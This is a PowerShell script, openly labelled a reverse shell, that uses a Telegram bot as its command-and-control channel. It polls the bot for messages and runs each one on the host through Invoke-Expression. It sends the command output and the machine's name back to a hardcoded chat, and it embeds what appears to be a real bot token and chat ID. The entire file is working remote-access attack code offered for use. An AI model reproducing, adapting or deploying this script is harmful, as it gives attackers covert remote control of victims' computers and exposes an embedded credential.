# Replace these values with your Telegram Bot Token and Chat ID
$BotToken = "8006651815:AAFdb-RBtAvHooLfklSitzk6yjh0ALccSpU"
$ChatID = "1542219670"

# Function to send a message to Telegram
function Send-TelegramMessage {
    param (
        [string]$Message
    )
    $Url = "https://api.telegram.org/bot$BotToken/sendMessage"
    $Body = @{
        chat_id = $ChatID
        text    = $Message
    }
    Invoke-RestMethod -Uri $Url -Method Post -Body $Body -ContentType "application/x-www-form-urlencoded"
}

# Function to fetch updates (commands) from Telegram
function Get-TelegramUpdates {
    param (
        [int]$Offset
    )
    $Url = "https://api.telegram.org/bot$BotToken/getUpdates"
    $Params = @{
        offset  = $Offset
        timeout = 10
    }
    return Invoke-RestMethod -Uri $Url -Method Get -Body $Params -ContentType "application/json"
}

# Function to execute a command and return the output
function Execute-Command {
    param (
        [string]$Command
    )
    try {
        Invoke-Expression $Command | Out-String
    } catch {
        $_.Exception.Message
    }
}

# Main reverse shell logic
function Start-ReverseShell {
    $Offset = 0
    Send-TelegramMessage "Reverse shell started on $env:COMPUTERNAME."

    while ($true) {
        $Updates = Get-TelegramUpdates -Offset $Offset
        if ($Updates.result) {
            foreach ($Update in $Updates.result) {
                $Offset = $Update.update_id + 1
                $Command = $Update.message.text

                if ($Command -eq "/stop") {
                    Send-TelegramMessage "Reverse shell stopped."
                    break
                }

                # Execute the received command
                $Output = Execute-Command -Command $Command
                Send-TelegramMessage "Command: $Command`n`nOutput:`n$Output"
            }
        }
        Start-Sleep -Seconds 2
    }
}

# Start the reverse shell
Start-ReverseShell
